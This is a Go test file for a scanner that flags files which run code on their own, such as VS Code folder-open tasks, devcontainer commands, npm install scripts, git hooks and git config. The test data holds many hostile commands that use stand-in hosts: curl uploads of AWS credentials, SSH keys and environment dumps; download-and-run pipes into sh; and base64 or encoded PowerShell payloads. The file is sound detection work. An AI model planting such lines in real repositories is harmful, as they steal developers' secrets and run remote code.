package autoexec_test

import (
	"context"
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
	"github.com/mrdhira/galahad/internal/protocol"
)

const (
	tasksFolderOpen = `// tasks
{
  "tasks": [ /* one */
    {
      "label": "init",
      "type": "shell",
      "command": "curl -s -d @$HOME/.aws/credentials https://collect.sinkhole.test/x",
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}
`
	tasksNoRunOn = `{
  "tasks": [
    {
      "label": "start",
      "command": "curl https://a.test/x.sh | sh"
    }
  ]
}
`
)

// findings runs the analyzer and returns "RULE:line" for the primary evidence of each finding, sorted.
func findings(t *testing.T, path, data string) ([]string, analyze.Output) {
	t.Helper()
	f := analyze.File{Path: path, Name: path[strings.LastIndex(path, "/")+1:], Data: []byte(data)}
	out, err := autoexec.New().Analyze(context.Background(), f)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, fi := range out.Findings {
		got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-AUTOEXEC-"), fi.Evidence[0].Line))
	}
	slices.Sort(got)
	return got, out
}

// fanOut returns a tasks file with n folder-open tasks that all depend on one
// task that downloads and runs code. Everything is on line 2.
func fanOut(n int) string {
	var b strings.Builder
	b.WriteString("{\"tasks\":[\n")
	b.WriteString("{\"label\":\"dep\",\"command\":\"curl https://a.test/x | sh\"}")
	for i := range n {
		fmt.Fprintf(&b, ",{\"label\":\"t%d\",\"command\":\"echo\",\"dependsOn\":\"dep\",\"runOptions\":{\"runOn\":\"folderOpen\"}}", i)
	}
	b.WriteString("]}")
	return b.String()
}

func TestAnalyze(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: "<rule suffix>:<line>" of the primary evidence
		want []string
	}{
		{name: "task on folder open with secret exfiltration in JSONC", path: ".vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
		{name: "task inside a container member", path: "repo.zip!/.vscode/tasks.json", data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
		{name: "script committed under .venv/bin is graded without inventory", path: ".venv/bin/pip", data: "#!/bin/sh\ncurl https://a.test/x | sh\n", want: []string{"011:2"}},
		{name: "script committed under a nested venv/Scripts is graded", path: "sub/venv/Scripts/activate.bat", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "script committed under node_modules/.bin is graded", path: "node_modules/.bin/tool", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "benign script under node_modules/.bin", path: "node_modules/.bin/tool", data: "#!/bin/sh\nexec node ../tool/cli.js \"$@\"\n"},
		{name: "task without runOn is not automatic", path: ".vscode/tasks.json", data: tasksNoRunOn},
		{name: "task with platform command and args", path: ".vscode/tasks.json", data: `{"tasks":[{
  "runOptions":{"runOn":"folderOpen"},
  "windows":{"command":"powershell","args":["-nop","-enc","SQBFAFgAIAAoAE4AZQB3AC0ATwBi"]}
}]}`, want: []string{"001:3", "012:3"}},
		{name: "task without command points at the task", path: ".vscode/tasks.json", data: `{"tasks":[
 {"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2"}},
		{name: "runOn is compared ignoring case", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"FolderOpen"}}]}`, want: []string{"001:1", "011:1"}},
		{name: "runOn that is not a string is ignored", path: ".vscode/tasks.json", data: `{"tasks":[{"command":"curl https://a.test/x | sh","runOptions":{"runOn":["folderOpen"]}}]}`},
		{name: "duplicate keys: the last command wins", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo hi\",\n\"command\":\"curl https://a.test/x | sh\",\n\"runOptions\":{\"runOn\":\"default\",\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
		{name: "byte order mark and comments before the root", path: ".vscode/tasks.json", data: "\xef\xbb\xbf// c\n{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:3"}},
		{name: "task options shell args are graded", path: ".vscode/tasks.json", data: `{"tasks":[{
"command":"bash",
"options":{"shell":{"executable":"bash","args":["-c","curl https://a.test/x | sh"]}},
"runOptions":{"runOn":"folderOpen"}}]}`, want: []string{"001:2", "011:2"}},
		{name: "dependsOn tasks are graded, cycles end", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo a","dependsOn":["b","a"],"runOptions":{"runOn":"folderOpen"}},
{"label":"b","command":"curl https://a.test/x | sh","dependsOn":"a"}]}`, want: []string{"001:2", "011:3"}},
		{name: "dependsOn task identifier objects are graded", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo","dependsOn":[{"type":"shell","task":"b"}],"runOptions":{"runOn":"folderOpen"}},
{"label":"b","type":"shell","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
		{name: "dependsOn as a single task identifier", path: ".vscode/tasks.json", data: `{"tasks":[
{"label":"a","command":"echo","dependsOn":{"type":"shell","task":"b"},"runOptions":{"runOn":"folderOpen"}},
{"label":"b","command":"curl https://a.test/x | sh"}]}`, want: []string{"001:2", "011:3"}},
		{name: "a task many tasks depend on is graded once, findings per rule are capped", path: ".vscode/tasks.json", data: fanOut(2000), want: append(slices.Repeat([]string{"001:2"}, protocol.MaxFindingsPerRulePerFile), "011:2")},
		{name: "tasks in a code-workspace file", path: "x.code-workspace", data: `{"folders":[],"tasks":{"tasks":[
{"command":"curl https://a.test/x | sh","runOptions":{"runOn":"folderOpen"}}]}}`, want: []string{"001:2", "011:2"}},
		{name: "settings tool path into the repo", path: ".vscode/settings.json", data: `{
  // tools
  "eslint.nodePath": "./tools/node",
  "python.defaultInterpreterPath": "${workspaceFolder}/tools/python",
  "php.validate.executablePath": "/usr/bin/php",
  "python.pythonPath": ".venv/bin/python",
  "editor.fontSize": 12
}`, want: []string{"002:3", "002:4"}},
		{name: "settings paths into a virtualenv or node_modules are not reported", path: ".vscode/settings.json", data: `{
  "python.defaultInterpreterPath": "${workspaceFolder}/.venv/bin/python",
  "python.pythonPath": "${workspaceFolder}\\venv\\Scripts\\python.exe",
  "eslint.nodePath": "${workspaceFolder}/node_modules/.bin/node",
  "php.validate.executablePath": "${workspaceFolder}/.venv/../tools/php"
}`, want: []string{"002:5"}},
		{name: "settings terminal shell args with a command", path: ".vscode/settings.json", data: `{
  "terminal.integrated.profiles.linux": {"x": {"path": "bash", "args": ["-c", "id"]}},
  "terminal.integrated.shellArgs.windows": ["-NoLogo"]
}`, want: []string{"002:2"}},
		{name: "devcontainer initializeCommand downloads and runs", path: ".devcontainer/devcontainer.json", data: `{
  "name": "x",
  "initializeCommand": "curl -fsSL https://a.test/i.sh | sh"
}`, want: []string{"003:3", "011:3"}},
		{name: "devcontainer lifecycle commands as string array and object", path: ".devcontainer.json", data: `{
  "postCreateCommand": ["npm", "install"],
  "postStartCommand": {
    "a": "echo hi",
    "b": "echo aGk= | base64 -d | sh"
  }
}`, want: []string{"004:2", "004:3", "012:5"}},
		{name: "npm install scripts and prepare", path: "package.json", data: `{
  "scripts": {
    "preinstall": "node a.js",
    "postinstall": "curl -fsSL https://a.test/i.sh | sh",
    "prepare": "husky",
    "start": "node index.js"
  }
}`, want: []string{"005:3", "005:4", "006:5", "011:4"}},
		{name: "npm preprepare and postprepare", path: "package.json", data: `{"scripts":{
"preprepare":"node a.js",
"postprepare":"echo aGk= | base64 -d | sh"}}`, want: []string{"006:2", "006:3", "012:3"}},
		{name: "husky 4 hooks in package.json", path: "package.json", data: `{"husky":{"hooks":{
"pre-commit":"curl https://a.test/x | sh","commit-msg":"echo ok"}}}`, want: []string{"006:2", "006:2", "011:2"}},
		{name: "npm package under node_modules is ignored", path: "node_modules/x/package.json", data: `{"scripts":{"postinstall":"node a.js"}}`},
		{name: "husky hook runs a download", path: ".husky/pre-commit", data: "#!/usr/bin/env sh\ncurl -fsSL https://a.test/h.sh | sh\n", want: []string{"006:2", "011:2"}},
		{name: "husky hook with a comment and a continued secret send", path: ".husky/pre-push", data: ". \"$(dirname -- \"$0\")/_/husky.sh\"\n# curl -d $API_TOKEN\ncat ~/.ssh/id_rsa | \\\n  curl -d @- https://a.test\n", want: []string{"006:3", "010:3"}},
		{name: "husky lint hook", path: ".husky/pre-commit", data: "npx lint-staged\n", want: []string{"006:1"}},
		{name: "husky bulk env dump sent away", path: ".husky/pre-push", data: "env | curl -d @- https://a.test\n", want: []string{"006:1", "010:1"}},
		{name: "husky helper husky.sh is ignored", path: ".husky/_/husky.sh", data: "curl x | sh\n"},
		{name: "husky generated files are graded without inventory", path: ".husky/_/h", data: "curl https://a.test/x | sh\n", want: []string{"011:1"}},
		{name: "pre-commit local hooks with entry and block entry", path: ".pre-commit-config.yaml", data: `repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: end-of-file-fixer
  - repo: local
    hooks:
      - id: a
        entry: ./scripts/check.sh
      - id: b
        entry: |
          curl -s https://a.test/x | sh
  - repo: https://github.com/x/y
    hooks:
      - id: c
`, want: []string{"006:11", "006:9", "011:11"}},
		{name: "pre-commit local without entry", path: ".pre-commit-config.yaml", data: "repos:\n  - repo: local\n    hooks: []\n", want: []string{"006:2"}},
		{name: "pre-commit remote hooks only", path: ".pre-commit-config.yaml", data: "repos:\n  - repo: https://github.com/x/y\n    hooks:\n      - id: c\n"},
		{name: "git config fsmonitor hooksPath sshCommand and smudge", path: ".git/config", data: `[core]
	repositoryformatversion = 0
	fsmonitor = curl -s https://a.test/m | sh
	hooksPath = .githooks
	sshCommand = ssh -i key
[filter "x"]
	smudge = cat
	clean = git-lfs clean -- %f
[core "y"]
`, want: []string{"009:3", "009:4", "009:5", "009:7", "011:3"}},
		{name: "git config key on the section header line", path: ".git/config", data: "[core] fsmonitor = curl https://a.test/x | sh\n", want: []string{"009:1", "011:1"}},
		{name: "git lfs filter chained with a download is still reported", path: ".git/config", data: "[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f && curl https://a.test/x | sh\n\tprocess = git-lfs filter-process\n\tclean = git-lfs-evil clean\n", want: []string{"009:2", "009:4", "011:2"}},
		{name: "git config values are graded even for a known tool", path: ".git/config", data: "[core]\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"x\"]\n\tprocess = git lfs filter-process\n"},
		{name: "git config benign values", path: ".git/config", data: "[core]\n\tfsmonitor = true\n\thooksPath = .husky/_\n\tsshCommand =\n[filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[user]\n\tname = x\n"},
		{name: "setup.py", path: "setup.py", data: "import os\nfrom setuptools import setup\nsetup(name='x')\n", want: []string{"007:3"}},
		{name: "setup.py without a setup call", path: "setup.py", data: "print(1)\n", want: []string{"007:1"}},
		{name: "pyproject backend-path", path: "pyproject.toml", data: "[project]\nbackend-path = ['x']\n[build-system]\nrequires = []\nbackend-path = ['build']\nbuild-backend = 'b'\n", want: []string{"007:5"}},
		{name: ".envrc is inventoried and graded", path: ".envrc", data: "# direnv\nexport A=1\ncurl https://a.test/i.sh | bash\n", want: []string{"008:1", "011:3"}},
		{name: "Makefile installer is inventory only", path: "Makefile", data: "tools:\n\tcurl -sSfL https://a.test/i.sh | sh\n", want: []string{"008:1"}},
		{name: "build.rs is inventory only", path: "build.rs", data: "fn main() {}\n", want: []string{"008:1"}},
		{name: "CI workflow is inventory only", path: ".github/workflows/ci.yml", data: "run: curl https://a.test | sh\n", want: []string{"008:1"}},
		{name: "unrelated file", path: "src/main.go", data: "package main\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
			if len(out.Skips) != 0 {
				t.Errorf("skips = %v, want none", out.Skips)
			}
		})
	}
}

func TestAnalyzeSkips(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantReason string
	}{
		{name: "json that does not parse", path: ".vscode/tasks.json", data: `{"tasks": [`, wantReason: "parse_error"},
		{name: "json root is not an object", path: "package.json", data: `[1]`, wantReason: "parse_error"},
		{name: "json nested too deep", path: "package.json", data: strings.Repeat("[", 200) + strings.Repeat("]", 200), wantReason: "parse_error"},
		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "too_large"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if len(got) != 0 {
				t.Errorf("findings = %v, want none", got)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
			}
		})
	}
}

func TestAnalyzeLexicalFallback(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: the findings, and a parse_error skip
		want []string
	}{
		{name: "tasks file with a missing comma", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"FOLDEROPEN\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "code-workspace with a syntax error", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\":\"folderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
		{name: "devcontainer with a syntax error", path: ".devcontainer/devcontainer.json", data: "{\n\"initializeCommand\":\"curl https://a.test/x | sh\"\n\"postCreateCommand\":\"echo hi\"}", want: []string{"003:2", "004:3", "011:2"}},
		{name: "folderOpen written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"\\u0066olderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "runOn key written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"run\\u004fn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "comment between runOn and its value", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\" /*x*/ : \"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "command written with a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"c\\u0075rl https://a.test/x | sh\"\n\"runOptions\":{\"runOn\":\"folderOpen\"}}]}", want: []string{"001:3", "011:2"}},
		{name: "an escaped backslash before u is not a unicode escape", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"echo\"\n\"runOptions\":{\"runOn\":\"\\\\u0066olderOpen\"}}]}"},
		{name: "devcontainer key written with a unicode escape", path: ".devcontainer/devcontainer.json", data: "{\n\"initialize\\u0043ommand\":\"curl https://a.test/x | sh\"\n\"x\":1}", want: []string{"003:2", "011:2"}},
		{name: "devcontainer lifecycle key behind a comment", path: ".devcontainer/devcontainer.json", data: "{\n\"postCreateCommand\" /*x*/ : \"echo hi\"\n\"x\":1}", want: []string{"004:2"}},
		{name: "code-workspace with a comment and an escape", path: "x.code-workspace", data: "{\"tasks\":{\"tasks\":[{\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"} \"command\":\"env | curl -d @- https://a.test\"}]}", want: []string{"001:2", "010:2"}},
		{name: "command graded even without a trigger in the broken file", path: ".vscode/tasks.json", data: "{\"tasks\":[{\n\"command\":\"curl https://a.test/x | sh\"\n\"label\":\"x\"}]}", want: []string{"011:2"}},
		{name: "devcontainer command graded even without a trigger in the broken file", path: "x/.devcontainer/devcontainer.json", data: "{\n\"x\":\"curl https://a.test/x | sh\"\n\"y\":1}", want: []string{"011:2"}},
		{name: "tasks file with a syntax error and no trigger", path: ".vscode/tasks.json", data: `{"tasks":[`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, out := findings(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != "parse_error" {
				t.Errorf("skips = %v, want one parse_error", out.Skips)
			}
		})
	}
}

func TestAnalyzeCancelled(t *testing.T) {
	tests := []struct {
		name    string
		wantErr bool
	}{
		{name: "cancelled context stops the analyzer", wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			cancel()

			_, err := autoexec.New().Analyze(ctx, analyze.File{Path: "package.json", Name: "package.json"})

			if (err != nil) != tt.wantErr {
				t.Errorf("err = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// expiring is a context that reports itself done after its first Err call.
type expiring struct {
	context.Context
	calls int
}

func (c *expiring) Err() error {
	c.calls++
	if c.calls > 1 {
		return context.DeadlineExceeded
	}
	return nil
}

func TestAnalyzeTimeout(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantReason string
	}{
		{name: "context ends while grading tasks", path: ".vscode/tasks.json", data: fanOut(10), wantReason: "timeout"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: tt.path, Name: "tasks.json", Data: []byte(tt.data)}

			out, err := autoexec.New().Analyze(&expiring{Context: context.Background()}, f)

			if err != nil {
				t.Fatal(err)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != tt.path {
				t.Errorf("skips = %v, want one %s for %s", out.Skips, tt.wantReason, tt.path)
			}
		})
	}
}

func TestStripJSONC(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		in string
		// expectations
		want string
	}{
		{name: "line and block comments and trailing commas", in: "{ // c\n \"a\": [1, 2,], /* b\n */ \"b\": 3, }", want: "{     \n \"a\": [1, 2 ],     \n    \"b\": 3  }"},
		{name: "comment markers inside strings stay", in: `{"u": "http://a/*b*/", "e": "q\"//x"}`, want: `{"u": "http://a/*b*/", "e": "q\"//x"}`},
		{name: "comma before a value stays", in: `[1,2]`, want: `[1,2]`},
		{name: "unterminated block comment", in: "{} /* x", want: "{}     "},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := string(autoexec.StripJSONC([]byte(tt.in)))

			if got != tt.want {
				t.Errorf("StripJSONC(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestName(t *testing.T) {
	tests := []struct {
		name     string
		wantName string
	}{
		{name: "analyzer name", wantName: "autoexec"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := autoexec.New().Name(); got != tt.wantName {
				t.Errorf("Name = %q, want %q", got, tt.wantName)
			}
		})
	}
}
